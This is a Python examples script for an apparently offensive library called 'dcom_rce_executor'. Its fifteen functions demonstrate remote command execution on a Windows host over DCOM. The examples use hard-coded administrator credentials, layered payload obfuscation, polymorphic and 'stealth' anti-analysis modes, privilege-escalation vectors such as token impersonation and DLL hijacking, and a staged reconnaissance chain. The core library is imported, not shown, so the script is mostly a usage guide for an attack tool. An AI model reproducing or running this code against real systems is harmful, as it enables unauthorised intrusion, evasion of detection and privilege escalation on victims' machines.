#!/usr/bin/env python3
"""
DCOM RCE Executor - Comprehensive Usage Examples
=================================================

Demonstrates various use cases and techniques for DCOM-based remote code execution.
"""

import json
from dcom_rce_executor import (
    create_dcom_executor,
    DCOMExecutor,
    DCOMConfig,
    DCOMObjectClass,
    AuthenticationMethod,
    PrivilegeEscalationVec,
    ObfuscationTechnique
)


def example_basic_execution():
    """Example 1: Basic command execution"""
    print("\n" + "="*70)
    print("Example 1: Basic Command Execution")
    print("="*70)

    executor = create_dcom_executor(
        target_host="192.168.1.100",
        dcom_class=DCOMObjectClass.WMI_LOCATOR
    )

    result = executor.execute_remote_command("whoami")
    print(f"Command: whoami")
    print(f"Success: {result['success']}")
    print(f"Target: {result['target_host']}")
    print(f"DCOM Object: {result['dcom_object']}")
    print(f"Payload ID: {result['payload_id']}")


def example_authenticated_execution():
    """Example 2: Authenticated execution with credentials"""
    print("\n" + "="*70)
    print("Example 2: Authenticated Command Execution")
    print("="*70)

    executor = create_dcom_executor(
        target_host="192.168.1.100",
        auth_method=AuthenticationMethod.NTLM,
        username="Administrator",
        password="Password123!",
        domain="CORP"
    )

    result = executor.execute_remote_command("systeminfo")
    print(f"Command: systeminfo")
    print(f"Auth Method: {result['auth_method']}")
    print(f"Success: {result['success']}")


def example_multiple_dcom_classes():
    """Example 3: Using different DCOM object classes"""
    print("\n" + "="*70)
    print("Example 3: Multiple DCOM Object Classes")
    print("="*70)

    dcom_classes = [
        DCOMObjectClass.WMI_LOCATOR,
        DCOMObjectClass.EXCEL_APPLICATION,
        DCOMObjectClass.WORD_APPLICATION,
        DCOMObjectClass.MMC_APPLICATION,
        DCOMObjectClass.SHELL_WINDOWS
    ]

    for dcom_class in dcom_classes:
        executor = create_dcom_executor(
            target_host="192.168.1.100",
            dcom_class=dcom_class
        )
        result = executor.execute_remote_command("whoami")
        print(f"DCOM Class: {dcom_class.name:25} - Success: {result['success']}")


def example_authentication_methods():
    """Example 4: Testing different authentication methods"""
    print("\n" + "="*70)
    print("Example 4: Authentication Methods")
    print("="*70)

    auth_methods = [
        (AuthenticationMethod.NTLM, "Administrator", "Password123!"),
        (AuthenticationMethod.KERBEROS, "Administrator", None),
        (AuthenticationMethod.NEGOTIATE, None, None),
        (AuthenticationMethod.IMPERSONATION, None, None),
        (AuthenticationMethod.DELEGATION, "Administrator", None),
    ]

    for auth_method, username, password in auth_methods:
        executor = create_dcom_executor(
            target_host="192.168.1.100",
            auth_method=auth_method,
            username=username,
            password=password,
            domain="CORP"
        )
        result = executor.execute_remote_command("whoami")
        print(f"Auth Method: {auth_method.value:15} - Success: {result['success']}")


def example_obfuscation_techniques():
    """Example 5: Payload obfuscation techniques"""
    print("\n" + "="*70)
    print("Example 5: Payload Obfuscation Techniques")
    print("="*70)

    techniques = [
        ObfuscationTechnique.BASE64_ENCODING,
        ObfuscationTechnique.HEX_ENCODING,
        ObfuscationTechnique.XOR_CIPHER,
        ObfuscationTechnique.RC4_CIPHER,
        ObfuscationTechnique.POLYGLOT_ENCODING,
        ObfuscationTechnique.POLYMORPHIC_TRANSFORM,
        ObfuscationTechnique.DEAD_CODE_INJECTION,
        ObfuscationTechnique.CONTROL_FLOW_FLATTEN,
        ObfuscationTechnique.STRING_OBFUSCATION,
        ObfuscationTechnique.JUNK_API_CALLS
    ]

    for technique in techniques:
        executor = create_dcom_executor(
            target_host="192.168.1.100",
            enable_obfuscation=True,
            obfuscation_methods=[technique]
        )
        result = executor.execute_remote_command("whoami")
        print(f"Technique: {technique.value:25} - Size: {result.get('marshalled_size', 0):5} bytes")


def example_multi_obfuscation():
    """Example 6: Multi-layer obfuscation"""
    print("\n" + "="*70)
    print("Example 6: Multi-Layer Obfuscation")
    print("="*70)

    executor = create_dcom_executor(
        target_host="192.168.1.100",
        enable_obfuscation=True,
        obfuscation_methods=[
            ObfuscationTechnique.BASE64_ENCODING,
            ObfuscationTechnique.XOR_CIPHER,
            ObfuscationTechnique.POLYMORPHIC_TRANSFORM,
            ObfuscationTechnique.DEAD_CODE_INJECTION
        ]
    )

    result = executor.execute_remote_command("whoami")
    print(f"Command: whoami")
    print(f"Obfuscation Chain: {result['obfuscation_methods']}")
    print(f"Payload Size: {result['marshalled_size']} bytes")
    print(f"Payload ID: {result['payload_id']}")


def example_privilege_escalation_vectors():
    """Example 7: Different privilege escalation vectors"""
    print("\n" + "="*70)
    print("Example 7: Privilege Escalation Vectors")
    print("="*70)

    vectors = [
        PrivilegeEscalationVec.PROCESS_INJECTION,
        PrivilegeEscalationVec.TOKEN_IMPERSONATION,
        PrivilegeEscalationVec.KERNEL_CALLBACK,
        PrivilegeEscalationVec.DLL_HIJACKING,
        PrivilegeEscalationVec.REGISTRY_ELEVATION,
        PrivilegeEscalationVec.SERVICE_EXPLOITATION,
        PrivilegeEscalationVec.SCHEDULED_TASK,
        PrivilegeEscalationVec.COM_MARSHALLING
    ]

    for vector in vectors:
        executor = create_dcom_executor(
            target_host="192.168.1.100",
            enable_eskalation=True,
            escalation_vec=vector
        )
        result = executor.execute_remote_command("whoami")
        escalation = result.get('escalation', {})
        print(f"Vector: {vector.value:25} - Success: {escalation.get('success', False)}")


def example_polymorphic_execution():
    """Example 8: Polymorphic execution chain"""
    print("\n" + "="*70)
    print("Example 8: Polymorphic Execution Chain")
    print("="*70)

    executor = create_dcom_executor(
        target_host="192.168.1.100",
        enable_polymorphism=True,
        enable_obfuscation=True
    )

    commands = ["whoami", "ipconfig", "systeminfo", "tasklist", "net user"]

    for cmd in commands:
        result = executor.execute_polymorphic_command(cmd)
        print(f"Command: {cmd:15} - Obfuscation: {result['obfuscation_methods']}")


def example_stealth_execution():
    """Example 9: Maximum stealth execution"""
    print("\n" + "="*70)
    print("Example 9: Maximum Stealth Execution")
    print("="*70)

    executor = create_dcom_executor(
        target_host="192.168.1.100",
        enable_obfuscation=True,
        enable_polymorphism=True,
        enable_anti_analysis=True
    )

    result = executor.execute_stealth_command("whoami")
    print(f"Command: whoami")
    print(f"Stealth Mode: Active")
    print(f"Obfuscation Chain: {result['obfuscation_methods']}")
    print(f"Anti-Analysis: Enabled")


def example_multi_stage_exploitation():
    """Example 10: Multi-stage exploitation chain"""
    print("\n" + "="*70)
    print("Example 10: Multi-Stage Exploitation Chain")
    print("="*70)

    executor = create_dcom_executor(
        target_host="192.168.1.100",
        enable_obfuscation=True,
        enable_eskalation=True
    )

    stages = [
        ("Stage 1 - Reconnaissance", "whoami"),
        ("Stage 2 - System Info", "systeminfo"),
        ("Stage 3 - Network Config", "ipconfig /all"),
        ("Stage 4 - Process List", "tasklist /v"),
        ("Stage 5 - User Enumeration", "net user")
    ]

    for stage_name, command in stages:
        result = executor.execute_remote_command(command)
        print(f"{stage_name:35} - Success: {result['success']}")

    report = executor.get_execution_report()
    print(f"\nTotal Executions: {report['total_executions']}")


def example_execution_report():
    """Example 11: Comprehensive execution report"""
    print("\n" + "="*70)
    print("Example 11: Execution Report")
    print("="*70)

    executor = create_dcom_executor(
        target_host="192.168.1.100",
        dcom_class=DCOMObjectClass.WMI_LOCATOR,
        enable_obfuscation=True
    )

    # Execute multiple commands
    commands = ["whoami", "ipconfig", "systeminfo"]
    for cmd in commands:
        executor.execute_remote_command(cmd)

    # Get comprehensive report
    report = executor.get_execution_report()

    print(f"Total Executions: {report['total_executions']}")
    print(f"Target Host: {report['target_host']}")
    print(f"Target Port: {report['target_port']}")
    print(f"DCOM Object: {report['dcom_object']}")
    print(f"Auth Method: {report['auth_method']}")
    print(f"Connection Established: {report['connection_established']}")
    print(f"Average Payload Size: {report['average_payload_size']} bytes")

    print("\nExecution Details:")
    for i, execution in enumerate(report['executions'], 1):
        print(f"  {i}. Command: {execution['command']:20} - Size: {execution.get('marshalled_size', 0)} bytes")


def example_custom_configuration():
    """Example 12: Custom configuration"""
    print("\n" + "="*70)
    print("Example 12: Custom Configuration")
    print("="*70)

    config = DCOMConfig(
        target_host="192.168.1.100",
        target_port=135,
        dcom_class=DCOMObjectClass.WMI_LOCATOR,
        auth_method=AuthenticationMethod.NEGOTIATE,
        username="Administrator",
        password="Password123!",
        domain="CORP",
        enable_obfuscation=True,
        enable_eskalation=True,
        escalation_vec=PrivilegeEscalationVec.TOKEN_IMPERSONATION,
        obfuscation_methods=[
            ObfuscationTechnique.BASE64_ENCODING,
            ObfuscationTechnique.XOR_CIPHER
        ],
        connectivity_test=False,
        timeout_ms=30000,
        retry_attempts=3
    )

    executor = DCOMExecutor(config)
    print(f"Configuration created:")
    print(f"  Target: {config.target_host}:{config.target_port}")
    print(f"  DCOM Object: {config.dcom_class.name}")
    print(f"  Auth Method: {config.auth_method.name}")
    print(f"  Obfuscation: Enabled")
    print(f"  Privilege Escalation: Enabled")

    result = executor.execute_remote_command("whoami")
    print(f"\nExecution Result: {result['success']}")


def example_payload_creation():
    """Example 13: Direct payload creation"""
    print("\n" + "="*70)
    print("Example 13: Payload Creation and Inspection")
    print("="*70)

    executor = create_dcom_executor(
        target_host="192.168.1.100",
        enable_obfuscation=True
    )

    payload = executor.create_payload("calc.exe", "Execute")

    print(f"Payload Created:")
    print(f"  ID: {payload.execution_context.get('timestamp', 'N/A')}")
    print(f"  Command: {payload.command}")
    print(f"  Method: {payload.method}")
    print(f"  Obfuscated: {payload.obfuscated}")
    print(f"  Marshalled Size: {len(payload.marshalled_object) if payload.marshalled_object else 0} bytes")
    print(f"  DCOM Class: {payload.object_class.name}")


def example_long_running_commands():
    """Example 14: Long-running command execution"""
    print("\n" + "="*70)
    print("Example 14: Long-Running Commands")
    print("="*70)

    executor = create_dcom_executor(
        target_host="192.168.1.100",
        timeout_ms=60000  # 60 second timeout
    )

    # Simulate long-running operations
    commands = [
        "systeminfo",
        "wmic logicaldisk get name,size,freespace",
        "net user /domain"
    ]

    for cmd in commands:
        result = executor.execute_remote_command(cmd)
        print(f"Command: {cmd:40} - Success: {result['success']}")


def example_error_handling():
    """Example 15: Error handling"""
    print("\n" + "="*70)
    print("Example 15: Error Handling")
    print("="*70)

    # Invalid host
    executor = create_dcom_executor(
        target_host="invalid-host-192.168.1.999",
        connectivity_test=False
    )

    result = executor.execute_remote_command("whoami")
    if not result['success']:
        print(f"Expected Error - Invalid Host")
        print(f"  Error: {result.get('error', 'Unknown error')}")

    # With retry mechanism
    executor = create_dcom_executor(
        target_host="192.168.1.100",
        retry_attempts=3,
        connectivity_test=False
    )

    result = executor.execute_remote_command("whoami")
    print(f"\nWith Retry Mechanism - Success: {result['success']}")


def run_all_examples():
    """Run all examples"""
    examples = [
        example_basic_execution,
        example_authenticated_execution,
        example_multiple_dcom_classes,
        example_authentication_methods,
        example_obfuscation_techniques,
        example_multi_obfuscation,
        example_privilege_escalation_vectors,
        example_polymorphic_execution,
        example_stealth_execution,
        example_multi_stage_exploitation,
        example_execution_report,
        example_custom_configuration,
        example_payload_creation,
        example_long_running_commands,
        example_error_handling
    ]

    for example_func in examples:
        try:
            example_func()
        except Exception as e:
            print(f"Error in {example_func.__name__}: {e}")

    print("\n" + "="*70)
    print("All Examples Completed")
    print("="*70)


if __name__ == "__main__":
    run_all_examples()
